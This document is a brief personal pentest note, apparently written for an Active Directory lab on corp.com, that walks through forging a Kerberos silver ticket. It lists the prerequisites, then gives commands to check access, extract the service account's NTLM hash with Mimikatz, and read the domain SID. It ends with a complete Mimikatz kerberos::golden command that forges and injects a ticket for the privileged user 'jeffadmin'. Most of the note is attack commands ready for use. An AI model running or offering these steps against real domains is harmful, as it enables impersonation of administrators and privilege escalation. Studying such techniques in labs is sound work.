#activedirectory #cracking 

- SPN password hash
- Domain SID
- Target SPN

1. Check access to the SPN via the Current User

```powershell
iwr -UseDefaultCredentials http://web04
```

2. Use Mimikatz to extract SPN NTLM Hash
3. Check the cached ticket in an Admin Powershell Prompt using below command
```powershell
klist #make sure to run as admin
```

5. Get the domain SID 
```cmd
whoami /user
```

```powershell
S-1-5-21-1987370270-658905905-1781884369-xxxxx #ignore Xs because thats RID
```

#### Create the Ticket For a High Priv User

```mimikatz
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
```

